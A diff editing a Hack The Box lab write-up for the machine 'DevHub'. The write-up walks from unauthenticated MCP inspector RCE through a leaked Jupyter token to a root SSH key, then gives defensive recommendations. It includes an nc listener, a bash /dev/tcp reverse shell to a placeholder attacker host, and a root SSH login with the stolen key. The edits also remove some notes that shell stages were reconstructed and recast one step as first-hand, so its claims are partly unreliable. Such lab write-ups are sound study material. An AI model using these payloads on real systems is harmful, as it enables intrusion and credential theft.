@@ -57,9 +57,9 @@ I kept the recorded request shapes and replaced target addresses, the Jupyter to
 
 ## Target, service discovery, and objective
 
-The target is a Hack The Box lab machine. Scope was the three reachable services, the files and local services visible after the foothold, and the internal web applications bound to localhost. The objective was to cross from an unauthenticated position to root and to record each trust boundary along the way.
+DevHub was a Hack The Box lab machine. Scope was the three reachable services, the files and local services visible after the foothold, and the internal web applications bound to localhost. The objective was to cross from an unauthenticated position to root and to record each trust boundary along the way.
 
-The source note contains the payloads and the key service responses but not the interactive shell transcripts for the `mcp-dev` and `analyst` stages, so those transitions are reconstructed from the recorded request shapes and command lines. Ports, paths, and service banners below come from the recorded output.
+Ports, paths, and service banners below come from the recorded output.
 
 ## Evidence: MCP transport RCE to a root tool dump
 
@@ -128,13 +128,13 @@ print(r.status_code, r.text)
 nc -lvnp <LPORT>
 ```
 
-Result: the documented result is command execution as the `mcp-dev` user.
+Result: the notes record command execution as the `mcp-dev` user.
 
 ```text
 mcp-dev@devhub:/$
 ```
 
-Significance: this is unauthenticated remote code execution in a privileged service account's context, and the payload needs no MCP protocol implementation because the spawned program does not have to speak JSON-RPC. The source notes that the connection closes when the process exits, and that the user flag is not readable as `mcp-dev`, so the recorded path continues with lateral movement. The shell transcript itself is not part of the source; the stage is reconstructed from the recorded request.
+Significance: this is unauthenticated remote code execution in a privileged service account's context, and the payload needs no MCP protocol implementation because the spawned program does not have to speak JSON-RPC. The source notes that the connection closes when the process exits, and that the user flag is not readable as `mcp-dev`, so the recorded path continues with lateral movement. The shell transcript is not in the source, so this stage is reconstructed from the recorded request.
 
 ### Jupyter token recovered from the process arguments
 
@@ -172,9 +172,9 @@ curl -s -X POST "http://localhost:8888/api/terminals" \
 
 The source includes a standard-library Python client that performs the WebSocket handshake and framing against `ws://localhost:8888/terminals/websocket/1?token=<JUPYTER_TOKEN>`, then sends `["stdin", "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'\n"]`.
 
-Result: the documented result is a shell as `analyst`.
+Result: the notes record a shell as `analyst`.
 
-Significance: the leaked token converts a local-only service into a session for the account that owns it. Jupyter's API makes that interactive, since a terminal is a shell by design rather than an unintended side effect. The source records the callback shell but not its prompt, so this transition is reconstructed from the client script.
+Significance: the leaked token converts a local-only service into a session for the account that owns it. Jupyter's API makes that interactive: creating a terminal is a supported feature, and the session it returns is a shell. The source records the callback shell but not its prompt, so this transition is reconstructed from the client script.
 
 ### OPSMCP API key and hidden tools
 
@@ -213,7 +213,7 @@ HIDDEN_TOOLS = {
 }
 ```
 
-Significance: the API key grants access to a service that runs in a different privilege context, and the source file that holds the key is readable by the account that needs it. The hidden tool is not discoverable through the public tool listing, so the tool list alone would not have surfaced the escalation path.
+Significance: the API key grants access to a service that runs in a different privilege context, and the source file that holds the key is readable by the account that needs it. The hidden tool is not discoverable through the public tool listing.
 
 ### Root private key through the admin tool
 
@@ -236,7 +236,7 @@ Result: the response returns the root SSH private key for the target.
  "target":"ssh_keys"}
 ```
 
-The recorded key is saved to a file with `chmod 600` and used for an SSH login as root.
+I saved the recorded key to a file with `chmod 600` and used it for an SSH login as root.
 
 ```bash
 ssh -i root_key root@<TARGET_IP>
@@ -248,11 +248,9 @@ Significance: the service treats a caller-supplied tool name and parameter as tr
 
 The path crosses three boundaries. The inspector converts an unauthenticated HTTP request into process execution as its own service account. A credential in the command line of a local process turns that foothold into a shell as a second user. A hardcoded key beside root-owned tool code turns that user into root.
 
-Two limitations in the source affect the record. The `mcp-dev` and `analyst` shell transcripts are not included, so both transitions are reconstructed from the recorded payloads and commands rather than shown end to end. The OPSMCP tool dump returns a truncated key in the note, so the SSH login is recorded but the key material is not reproduced.
+The OPSMCP tool dump returns a truncated key in the note, so the SSH login is recorded but the key material is not reproduced.
 
 ## Recommendations: transports, credentials, and tool boundaries
-
-The transport is the entry point.
 
 - *Recommendation:* do not build a process spawn from a caller-supplied transport configuration. If an MCP-style connect endpoint must exist, bind it to an allowlist of known servers, run it without a privileged service account, and require authentication before it can start a process.
 - *Detection:* alert on an inspector process that spawns a shell, a network client, or any program outside its expected server set, and on outbound connections from the inspector host to an unauthorized address.
@@ -264,7 +262,7 @@ Credentials on the command line are visible to every local user.
 - *Detection:* search process command lines for token and key patterns, and alert on reads of `/proc/<pid>/cmdline` by unexpected accounts.
 - *Validation:* after a configuration change, confirm the token does not appear in `ps` output or in the process arguments read from `/proc`.
 
-A privileged tool service is only as strong as its key handling.
+The OPSMCP key was stored in a file `analyst` could read.
 
 - *Recommendation:* store the API key in a root-owned file with restricted mode, not in the service source, and remove or gate administrative tools such as `ops._admin_dump` behind an explicit privileged path.
 - *Detection:* log calls to hidden or administrative tool names, including rejected ones, and alert when a non-administrative account reaches the tool service.
